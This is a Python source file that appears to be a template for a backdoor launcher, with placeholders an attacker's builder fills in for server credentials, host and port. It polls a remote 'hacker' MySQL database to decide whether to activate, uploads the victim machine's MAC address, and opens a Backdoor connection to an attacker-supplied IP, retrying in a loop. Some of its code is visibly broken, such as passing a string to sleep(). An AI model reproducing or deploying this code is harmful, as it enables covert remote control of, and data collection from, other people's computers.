from client import Backdoor
from time import sleep
from mysql.connector import connect
from uuid import getnode as getmac


# sleep for x seconds before start
sleep('**sleep**')


def get_mac_address():
    """
    DOCSTRING: this function will return the mac address asa a string
    """
    mac_number = hex(getmac())[2:]

    mac_address = ''
    for index in range(int(len(mac_number) / 2)):
        mac_address += mac_number[index*2 : index*2+2] + ':'

    mac_address = mac_address[:-1]

    return mac_address


def read_online_data(program_id):
    hacker_database = connect(
        host='**server**',
        user='**uname**',
        passwd='**passwd**',
        database='**dbname**',
        port='**port**'
    )
    my_cursor = hacker_database.cursor()

    command = "SELECT `ip` FROM `ip_addr` WHERE `id` = 1"
    my_cursor.execute(command)
    host_ip = my_cursor.fetchall()[0][0]

    command = "SELECT `hack` FROM `users` WHERE `p_id` = {}".format(program_id)
    my_cursor.execute(command)
    hack = my_cursor.fetchall()[0][0]

    if hack == '1' or hack == 1:
        hack = True
        command = "UPDATE `users` SET `mac_addr` = '{}' WHERE `p_id` = {}".format(get_mac_address(), program_id)
        my_cursor.execute(command)
    else:
        hack = False

    hacker_database.commit()
    return hack, str(host_ip)


def start(p_id, port, sleep_time=60):
    while True:
        try:
            status, host_ip = read_online_data(p_id)

            dyanamic_ip = '**dhost**'

            if not dyanamic_ip:
                host_ip = '**lhost**'

            if status:
                my_backdoor = Backdoor(host_ip, port)
                my_backdoor.start()
            else:
                sleep(sleep_time)
        except:
            sleep(sleep_time)
            start(program_id, port_value, sleep_value)


# this is the program if of the program
program_id = '**p_id**'
port_value = '**lport**'
sleep_value = '**sleep**'

start(program_id, port_value, sleep_value)
